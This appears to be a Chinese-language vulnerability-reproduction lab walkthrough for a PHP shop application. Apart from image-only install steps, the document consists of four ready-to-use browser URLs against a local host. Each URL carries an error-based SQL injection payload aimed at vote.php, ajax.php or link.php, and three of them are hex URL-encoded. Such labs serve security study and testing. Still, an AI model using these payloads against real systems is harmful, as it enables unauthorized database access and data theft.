
# 实战
在浏览器输入
```
http://IP:PORT/
```
## 安装

![image]({path}/1.png)

![image]({path}/2.png)



## 攻击实战

在浏览器输入
```
http://192.168.1.170:7777/vote.php?act=dovote&name[1 and (select 1 from(select count(*),concat(0x7c,md5(123),0x7c,floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)%23][111]=aa
```

![image]({path}/3.png)


在浏览器输入

```
http://192.168.1.170:7777/ajax.php?act=check_field&field_name=%61%27%20%61%6E%64%28%73%65%6C%65%63%74%20%31%20%66%72%6F%6D%28%73%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%2C%63%6F%6E%63%61%74%28%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%63%6F%6E%63%61%74%28%30%78%37%65%2C%6D%64%35%28%33%2E%31%34%31%35%29%2C%30%78%37%65%29%29%29%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%6C%69%6D%69%74%20%30%2C%31%29%2C%66%6C%6F%6F%72%28%72%61%6E%64%28%30%29%2A%32%29%29%78%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%67%72%6F%75%70%20%62%79%20%78%29%61%29%23'
```
![image]({path}/4.png)

在浏览器输入
```
http://192.168.1.170:7777/ajax.php?act=verify_ecv&ecvsn=1%27%61%6E%64%28%73%65%6C%65%63%74%20%31%20%66%72%6F%6D%28%73%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%2C%63%6F%6E%63%61%74%28%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%63%6F%6E%63%61%74%28%30%78%37%65%2C%6D%64%35%28%33%2E%31%34%31%35%29%2C%30%78%37%65%29%29%29%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%6C%69%6D%69%74%20%30%2C%31%29%2C%66%6C%6F%6F%72%28%72%61%6E%64%28%30%29%2A%32%29%29%78%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%67%72%6F%75%70%20%62%79%20%78%29%61%29%23
```

![image]({path}/5.png)

在浏览器输入


```
http://192.168.1.170:7777/link.php?act=go&url=%27%29%20%61%6E%64%28%73%65%6C%65%63%74%20%31%20%66%72%6F%6D%28%73%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%2C%63%6F%6E%63%61%74%28%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%63%6F%6E%63%61%74%28%30%78%37%65%2C%6D%64%35%28%33%2E%31%34%31%35%29%2C%30%78%37%65%29%29%29%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%6C%69%6D%69%74%20%30%2C%31%29%2C%66%6C%6F%6F%72%28%72%61%6E%64%28%30%29%2A%32%29%29%78%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%67%72%6F%75%70%20%62%79%20%78%29%61%29%23
```
